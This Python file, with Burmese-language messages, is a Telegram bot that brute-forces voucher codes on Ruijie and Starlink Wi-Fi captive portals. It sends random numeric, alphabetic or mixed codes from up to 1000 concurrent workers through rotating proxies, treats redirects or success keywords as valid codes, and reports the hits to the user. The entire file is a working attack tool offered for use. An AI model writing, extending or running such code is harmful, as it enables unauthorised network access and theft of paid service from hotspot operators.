import os
import logging
import asyncio
import aiohttp
import random
import string
import time
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import ApplicationBuilder, ContextTypes, CommandHandler, CallbackQueryHandler, MessageHandler, filters

# Logging setup
logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
logger = logging.getLogger(__name__)

def load_proxies_from_file():
    filenames = [
        "Proxy.txt", "proxy.txt",
        "../Proxy.txt", "../proxy.txt"
    ]
    for filename in filenames:
        if os.path.exists(filename):
            try:
                with open(filename, "r", encoding="utf-8") as f:
                    proxies = [line.strip() for line in f if line.strip() and not line.startswith("#")]
                    if proxies:
                        print(f"[ProxyManager] Successfully loaded {len(proxies)} proxies from {filename}")
                        return proxies
            except Exception as e:
                print(f"[ProxyManager] Error reading {filename}: {e}")
    print("[ProxyManager] Warning: No proxies found in files!")
    return []

# Tracking states
scanning_states = {}
user_modes = {}
user_workers = {}
user_portals = {}
user_proxies = {}
proxy_indices = {}
found_codes = {}
current_codes_tracker = {}
tried_counters = {}
expired_counters = {}
limits_counters = {}

def show_startup_banner():
    print("=" * 65)
    print("  ⚡  RUIJIE & STARLINK EXTREME SCANNER  ⚡")
    print("=" * 65)
    print("Checking authorization...")
    print("[+] Access Granted!")
    print("[*] Status: Online & Ready")
    print("=" * 65)
    print("[ProxyManager] Proxy Manager initialized successfully")
    print("Bot is running with python-telegram-bot...")
    print("=" * 65)

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.effective_chat.id
    if chat_id not in user_modes:
        user_modes[chat_id] = "num6"
    if chat_id not in user_workers:
        user_workers[chat_id] = 300
    
    if chat_id not in user_proxies or not user_proxies[chat_id]:
        user_proxies[chat_id] = load_proxies_from_file()
    
    if chat_id not in proxy_indices:
        proxy_indices[chat_id] = 0
        
    total_proxies = len(user_proxies.get(chat_id, []))
    current_proxy_display = f"{proxy_indices[chat_id] + 1}/{total_proxies}" if total_proxies > 0 else "0/0"
    
    keyboard = [
        [InlineKeyboardButton("🌐 Update Portal Link", callback_data="update_portal")],
        [InlineKeyboardButton("⚙️ Mode", callback_data="change_mode")],
        [InlineKeyboardButton(f"🔧 Workers: {user_workers[chat_id]}", callback_data="change_workers")],
        [InlineKeyboardButton(f"🔀 Proxies: {current_proxy_display}", callback_data="add_proxies")],
        [InlineKeyboardButton("🚀 Start Scanner", callback_data="start_scanner")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    text = (
        "⚡ Starlink & Ruijie Scanner Control Panel ⚡\n\n"
        f"⚙ Mode: {user_modes[chat_id]}\n"
        f"🔧 Workers: {user_workers[chat_id]}\n"
        f"📁 Proxy File: Loaded from Proxy.txt\n"
        f"🔀 Proxies: {current_proxy_display}"
    )
    
    if update.message:
        await update.message.reply_text(text, reply_markup=reply_markup)
    elif update.callback_query:
        try:
            await update.callback_query.message.edit_text(text, reply_markup=reply_markup)
        except Exception:
            pass

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    chat_id = query.message.chat_id
    
    data = query.data
    if data == "update_portal":
        await query.answer()
        context.user_data['waiting_for'] = 'portal'
        await query.message.reply_text("🔗 Ruijie/Starlink Portal URL (wifidog link) ကို ပို့ပေးပါ:")
    
    elif data == "change_mode":
        await query.answer()
        keyboard = [
            [InlineKeyboardButton("num6", callback_data="mode_num6"), InlineKeyboardButton("num7", callback_data="mode_num7"), InlineKeyboardButton("num8", callback_data="mode_num8")],
            [InlineKeyboardButton("num9", callback_data="mode_num9")],
            [InlineKeyboardButton("abc6", callback_data="mode_abc6"), InlineKeyboardButton("mix6", callback_data="mode_mix6"), InlineKeyboardButton("mix7", callback_data="mode_mix7")],
            [InlineKeyboardButton("🔙 Back", callback_data="mode_back")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await query.message.edit_text("⚙ Choose Scanner Mode", reply_markup=reply_markup)
    
    elif data.startswith("mode_"):
        await query.answer()
        selected_mode = data.replace("mode_", "")
        if selected_mode == "back":
            await start(update, context)
        else:
            user_modes[chat_id] = selected_mode
            await start(update, context)
            
    elif data == "change_workers":
        await query.answer()
        keyboard = [
            [InlineKeyboardButton("300", callback_data="worker_300"), InlineKeyboardButton("500", callback_data="worker_500")],
            [InlineKeyboardButton("800", callback_data="worker_800"), InlineKeyboardButton("1000", callback_data="worker_1000")],
            [InlineKeyboardButton("🔙 Back", callback_data="worker_back")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await query.message.edit_text("⚙️ Choose Worker Count", reply_markup=reply_markup)
        
    elif data.startswith("worker_"):
        await query.answer()
        selected = data.replace("worker_", "")
        if selected == "back":
            await start(update, context)
        else:
            user_workers[chat_id] = int(selected)
            await start(update, context)

    elif data == "add_proxies":
        all_proxies = user_proxies.get(chat_id, [])
        if not all_proxies:
            all_proxies = load_proxies_from_file()
            user_proxies[chat_id] = all_proxies
            
        if all_proxies:
            if chat_id not in proxy_indices:
                proxy_indices[chat_id] = 0
            proxy_indices[chat_id] = (proxy_indices[chat_id] + 1) % len(all_proxies)
            
        await query.answer()
        await start(update, context)
    
    elif data == "start_scanner":
        await query.answer()
        portal = user_portals.get(chat_id)
        if not portal:
            await query.message.reply_text("⚠️ ပထမဦးစွာ Portal URL ကို အရင် Update လုပ်ပါ။")
            return
        if scanning_states.get(chat_id, False):
            await query.message.reply_text("⚠️ စကင်န်ဖတ်ခြင်း လုပ်ငန်းစဉ် လုပ်ဆောင်ဆဲ ဖြစ်ပါသည်။")
            return
        asyncio.create_task(run_scanner_with_workers(query, context, portal))
        
    elif data == "stop_scanner_btn":
        await query.answer("🛑 စကင်န်ဖတ်ခြင်းကို ရပ်တန့်နေပါပြီ...")
        scanning_states[chat_id] = False

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.effective_chat.id
    text = update.message.text.strip()
    waiting_for = context.user_data.get('waiting_for')
    
    if waiting_for == 'portal':
        user_portals[chat_id] = text
        context.user_data['waiting_for'] = None
        await update.message.reply_text("✅ Portal URL အောင်မြင်စွာ သိမ်းဆည်းပြီးပါပြီ။")
        await start(update, context)
    else:
        await update.message.reply_text("ℹ️ ကျေးဇူးပြု၍ မီနူးခလုတ်များကို အသုံးပြုပါ။")

def generate_code_by_mode(mode):
    length = 6
    for char in mode:
        if char.isdigit():
            length = int(char)
            break
            
    if "num" in mode or "Number" in mode:
        return "".join(random.choices(string.digits, k=length))
    elif "mix" in mode or "Mix" in mode:
        chars = string.ascii_lowercase + string.digits
        return "".join(random.choices(chars, k=length))
    elif "abc" in mode or "Abc" in mode:
        return "".join(random.choices(string.ascii_lowercase, k=length))
    else:
        return "".join(random.choices(string.digits, k=length))

async def worker_task(worker_id, session, portal_url, chat_id):
    while scanning_states.get(chat_id, False):
        mode = user_modes.get(chat_id, "num6")
        code_val = generate_code_by_mode(mode)
        
        tried_counters[chat_id] = tried_counters.get(chat_id, 0) + 1
        current_codes_tracker[chat_id] = code_val
        
        proxies_list = user_proxies.get(chat_id, [])
        proxy = None
        if proxies_list:
            idx = proxy_indices.get(chat_id, 0)
            proxy = proxies_list[idx % len(proxies_list)]
            
        if proxy and not proxy.startswith("http"):
            proxy = f"http://{proxy}"
            
        try:
            target_url = f"{portal_url}&code={code_val}" if "?" in portal_url else f"{portal_url}?code={code_val}"
            async with session.get(target_url, proxy=proxy, timeout=3.0) as response:
                html_content = await response.text()
                lower_html = html_content.lower()
                
                # ပိုမိုစုံလင်သော Success Keywords များ
                success_keywords = [
                    "success", "welcome", "connected", "auth_pass", "login successfully", 
                    "internet", "minutes", "hours", "remaining", "authenticated", 
                    "congratulations", "online", "access granted"
                ]
                expired_keywords = ["expired", "invalid", "timeout", "used", "incorrect", "wrong"]
                limit_keywords = ["limit", "already logged", "in use", "too many", "blocked", "restricted", "exceeded"]
                
                # အောင်မြင်မှု အခြေအနေစစ်ဆေးခြင်း (Redirect သို့မဟုတ် Success Keywords ပါဝင်ခြင်း)
                is_success = (
                    (response.status == 200 and any(kw in lower_html for kw in success_keywords) and "error" not in lower_html and "fail" not in lower_html) or
                    response.status in [301, 302, 303]
                )

                if is_success:
                    if chat_id not in found_codes:
                        found_codes[chat_id] = []
                    if code_val not in found_codes[chat_id]:
                        found_codes[chat_id].append(code_val)
                elif any(kw in lower_html for kw in expired_keywords):
                    expired_counters[chat_id] = expired_counters.get(chat_id, 0) + 1
                elif any(kw in lower_html for kw in limit_keywords):
                    limits_counters[chat_id] = limits_counters.get(chat_id, 0) + 1
                    
        except Exception:
            pass
        await asyncio.sleep(0.002)

async def run_scanner_with_workers(query, context, portal_url):
    chat_id = query.message.chat_id
    scanning_states[chat_id] = True
    found_codes[chat_id] = []
    tried_counters[chat_id] = 0
    expired_counters[chat_id] = 0
    limits_counters[chat_id] = 0
    
    start_time = time.time()
    workers_count = user_workers.get(chat_id, 300)
    mode = user_modes.get(chat_id, "num6")
    
    stop_keyboard = InlineKeyboardMarkup([[InlineKeyboardButton("🛑 Stop", callback_data="stop_scanner_btn")]])
    
    initial_text = (
        "⚡ Scanner Running ⚡\n\n"
        "⏳ စတင်နေပါပြီ..."
    )
    status_message = await query.message.reply_text(
        initial_text, 
        reply_markup=stop_keyboard
    )
    
    connector = aiohttp.TCPConnector(limit=workers_count, limit_per_host=workers_count, ssl=False)
    async with aiohttp.ClientSession(connector=connector) as session:
        tasks = [
            asyncio.create_task(worker_task(i, session, portal_url, chat_id)) 
            for i in range(workers_count)
        ]
        
        while scanning_states.get(chat_id, False):
            await asyncio.sleep(1.0)
            
            elapsed = time.time() - start_time
            tried = tried_counters.get(chat_id, 0)
            expired = expired_counters.get(chat_id, 0)
            limits = limits_counters.get(chat_id, 0)
            speed = (tried / elapsed * 60) if elapsed > 0 else 0.0
            
            hits_list = found_codes.get(chat_id, [])
            hits_str = ", ".join(hits_list[-5:]) if hits_list else "None yet"
            current_code = current_codes_tracker.get(chat_id, generate_code_by_mode(mode))
            
            live_text = (
                "⚡ Scanner Running ⚡\n\n"
                f"🏹 Tried: {tried:,}\n"
                f"🎯 Current Code: {current_code}\n"
                f"🔥 Hits: {len(hits_list)}\n"
                f"❌ Expired: {expired}\n"
                f"⚠️ Limits: {limits}\n"
                f"⚡ Speed: {speed:,.1f} c/m\n"
                "___________________________________\n"
                "🔥 Hit Codes Found:\n"
                f"{hits_str}"
            )
            try:
                await status_message.edit_text(live_text, reply_markup=stop_keyboard)
            except Exception as e:
                print(f"Edit text error: {e}")
            
        for task in tasks:
            task.cancel()

    final_hits = found_codes.get(chat_id, [])
    final_text = "🛑 စကင်န်ဖတ်ခြင်း ရပ်တန့်သွားပါပြီ။\n\n"
    if final_hits:
        final_text += "🔥 Hit Codes Found:\n" + "\n".join(final_hits)
    else:
        final_text += "ℹ️ တွေ့ရှိသော Code အသစ် မရှိသေးပါ။"
        
    await query.message.reply_text(final_text)

async def stop_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.effective_chat.id
    if scanning_states.get(chat_id, False):
        scanning_states[chat_id] = False
        await update.message.reply_text("🛑 စကင်န်ဖတ်ခြင်းကို ရပ်တန့်နေပါပြီ...")
    else:
        await update.message.reply_text("ℹ️ လက်ရှိ အလုပ်လုပ်နေသော စကင်န် မရှိပါ။")

def main():
    show_startup_banner()
    
    token = os.environ.get("BOT_TOKEN")
    if not token:
        print("Error: BOT_TOKEN ကို Replit Secrets ထဲတွင် ထည့်သွင်းပေးပါ။")
        return

    application = ApplicationBuilder().token(token).build()
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("stop", stop_command))
    application.add_handler(CallbackQueryHandler(button_handler))
    application.add_handler(MessageHandler(filters.TEXT & (~filters.COMMAND), handle_message))

    print("🤖 Bot အသင့်ဖြစ်ပါပြီ...")
    application.run_polling()

if __name__ == '__main__':
    main()
    
